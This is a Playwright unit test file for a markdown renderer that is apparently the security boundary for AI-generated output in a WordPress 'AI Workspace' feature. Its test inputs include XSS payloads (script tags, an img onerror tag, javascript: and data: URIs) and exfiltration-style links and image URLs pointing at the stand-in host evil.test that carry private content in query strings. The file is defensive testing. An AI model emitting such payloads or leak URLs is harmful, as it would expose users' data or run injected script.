/**
 * Unit coverage for the AI Workspace restricted-subset markdown renderer.
 *
 * The renderer is the R19 / KTD9 security boundary and is pure logic, so it is
 * asserted directly rather than through the browser. These tests use no browser
 * fixture and run in any Playwright project.
 *
 * External dependencies
 */
/**
 * External dependencies
 */
import { expect, test } from '@playwright/test';

/**
 * Internal dependencies
 */
import {
	renderMarkdown,
	type BlockNode,
	type InlineNode,
} from '../../../../src/experiments/ai-workspace/utils/render-markdown';

const OPTIONS = { allowedHost: 'example.test' };

/**
 * Collects every inline node in a tree, depth first.
 *
 * @param blocks The block nodes.
 * @return The inline nodes.
 */
function inlineNodes( blocks: BlockNode[] ): InlineNode[] {
	const collected: InlineNode[] = [];

	const walkInline = ( nodes: InlineNode[] ): void => {
		nodes.forEach( ( node ) => {
			collected.push( node );

			if ( 'strong' === node.type || 'emphasis' === node.type ) {
				walkInline( node.children );
			}
		} );
	};

	const walkBlocks = ( nodes: BlockNode[] ): void => {
		nodes.forEach( ( block ) => {
			if ( 'blockquote' === block.type ) {
				walkBlocks( block.children );
				return;
			}

			if ( 'list' === block.type ) {
				block.items.forEach( walkInline );
				return;
			}

			if ( 'codeBlock' === block.type ) {
				return;
			}

			walkInline( block.children );
		} );
	};

	walkBlocks( blocks );

	return collected;
}

/**
 * Returns the concatenated text of every text node in a tree.
 *
 * @param blocks The block nodes.
 * @return The text.
 */
function textOf( blocks: BlockNode[] ): string {
	return inlineNodes( blocks )
		.map( ( node ) => ( 'text' === node.type ? node.value : '' ) )
		.join( '' );
}

test.describe( 'AI Workspace markdown renderer', () => {
	test( 'renders the allowed inline subset', () => {
		const blocks = renderMarkdown(
			'Plain **bold** and *italic* with `code()`.',
			OPTIONS
		);

		expect( blocks ).toHaveLength( 1 );
		expect( blocks[ 0 ]?.type ).toBe( 'paragraph' );

		const types = inlineNodes( blocks ).map( ( node ) => node.type );

		expect( types ).toContain( 'strong' );
		expect( types ).toContain( 'emphasis' );
		expect( types ).toContain( 'code' );
	} );

	test( 'renders headings, lists, blockquotes and fenced code', () => {
		const blocks = renderMarkdown(
			[
				'## Findings',
				'',
				'- first',
				'- second',
				'',
				'1. one',
				'2. two',
				'',
				'> quoted line',
				'',
				'```php',
				'echo "hi";',
				'```',
			].join( '\n' ),
			OPTIONS
		);

		const types = blocks.map( ( block ) => block.type );

		expect( types ).toEqual( [
			'heading',
			'list',
			'list',
			'blockquote',
			'codeBlock',
		] );

		const heading = blocks[ 0 ];
		expect( heading?.type === 'heading' && heading.level ).toBe( 2 );

		const unordered = blocks[ 1 ];
		expect( unordered?.type === 'list' && unordered.ordered ).toBe( false );
		expect( unordered?.type === 'list' && unordered.items.length ).toBe(
			2
		);

		const ordered = blocks[ 2 ];
		expect( ordered?.type === 'list' && ordered.ordered ).toBe( true );

		const code = blocks[ 4 ];
		expect( code?.type === 'codeBlock' && code.language ).toBe( 'php' );
		expect( code?.type === 'codeBlock' && code.value ).toBe( 'echo "hi";' );
	} );

	test( 'never emits raw HTML as markup', () => {
		const blocks = renderMarkdown(
			'<script>alert(1)</script><img src="https://evil.test/x" onerror="x">',
			OPTIONS
		);

		const types = inlineNodes( blocks ).map( ( node ) => node.type );

		expect( types ).toEqual( [ 'text' ] );
		expect( textOf( blocks ) ).toContain( '<script>alert(1)</script>' );
		expect( textOf( blocks ) ).toContain(
			'<img src="https://evil.test/x"'
		);
	} );

	test( 'reduces an inline image to an inert image node', () => {
		const blocks = renderMarkdown(
			'![a caption](https://evil.test/pixel.png?leak=secret)',
			OPTIONS
		);

		const nodes = inlineNodes( blocks );

		expect( nodes ).toHaveLength( 1 );
		expect( nodes[ 0 ] ).toEqual( {
			type: 'image',
			alt: 'a caption',
			destination: 'https://evil.test/pixel.png?leak=secret',
		} );
	} );

	test( 'does not resolve reference-style images or their definitions', () => {
		const blocks = renderMarkdown(
			[ '![alt][ref]', '', '[ref]: https://evil.test/pixel.png' ].join(
				'\n'
			),
			OPTIONS
		);

		const types = inlineNodes( blocks ).map( ( node ) => node.type );

		expect( types.includes( 'image' ) ).toBe( false );
		expect( types.includes( 'link' ) ).toBe( false );
		expect( textOf( blocks ) ).toContain( '![alt][ref]' );
		expect( textOf( blocks ) ).toContain(
			'[ref]: https://evil.test/pixel.png'
		);
	} );

	test( 'keeps a same-host link live and carries its destination', () => {
		const blocks = renderMarkdown(
			'[Edit the post](https://example.test/wp-admin/post.php?post=7&action=edit)',
			OPTIONS
		);

		expect( inlineNodes( blocks )[ 0 ] ).toEqual( {
			type: 'link',
			label: 'Edit the post',
			destination:
				'https://example.test/wp-admin/post.php?post=7&action=edit',
			inert: false,
		} );
	} );

	test( 'resolves a relative destination against the allowed host', () => {
		const blocks = renderMarkdown(
			'[Drafts](/wp-admin/edit.php?post_status=draft)',
			OPTIONS
		);

		const node = inlineNodes( blocks )[ 0 ];

		expect( node?.type === 'link' && node.inert ).toBe( false );
	} );

	test( 'makes an off-site link inert while preserving its destination', () => {
		const blocks = renderMarkdown(
			'[Review the summary](https://evil.test/collect?notes=private+content+from+the+site)',
			OPTIONS
		);

		expect( inlineNodes( blocks )[ 0 ] ).toEqual( {
			type: 'link',
			label: 'Review the summary',
			destination:
				'https://evil.test/collect?notes=private+content+from+the+site',
			inert: true,
		} );
	} );

	test( 'makes non-http schemes inert', () => {
		const destinations = [
			'javascript:alert(1)',
			'JavaScript:alert(1)',
			'data:text/html;base64,PHNjcmlwdD4=',
			'blob:https://example.test/1234',
			'//evil.test/collect?q=secret',
		];

		destinations.forEach( ( destination ) => {
			const node = inlineNodes(
				renderMarkdown( `[go](${ destination })`, OPTIONS )
			)[ 0 ];

			expect(
				node?.type === 'link' && node.inert,
				`${ destination } must be inert`
			).toBe( true );
		} );
	} );

	test( 'ignores a link title and angle-bracketed destination', () => {
		const node = inlineNodes(
			renderMarkdown(
				'[go](<https://example.test/a> "a title")',
				OPTIONS
			)
		)[ 0 ];

		expect( node?.type === 'link' && node.destination ).toBe(
			'https://example.test/a'
		);
	} );

	test( 'treats every link as inert when no host is allowed', () => {
		const node = inlineNodes(
			renderMarkdown( '[go](https://example.test/a)', {
				allowedHost: '',
			} )
		)[ 0 ];

		expect( node?.type === 'link' && node.inert ).toBe( true );
	} );

	test( 'does not parse markdown inside inline code or code blocks', () => {
		const blocks = renderMarkdown(
			'`[not a link](https://evil.test)` and `<b>text</b>`',
			OPTIONS
		);

		const types = inlineNodes( blocks ).map( ( node ) => node.type );

		expect( types.includes( 'link' ) ).toBe( false );
		expect( types.filter( ( type ) => 'code' === type ) ).toHaveLength( 2 );
	} );

	test( 'renders partial output without throwing', () => {
		const partials = [
			'**unclosed bold',
			'[unclosed link](https://example.test',
			'```php\necho "unterminated";',
			'![unclosed image',
			'#',
			'',
		];

		partials.forEach( ( partial ) => {
			expect( () => renderMarkdown( partial, OPTIONS ) ).not.toThrow();
		} );
	} );
} );
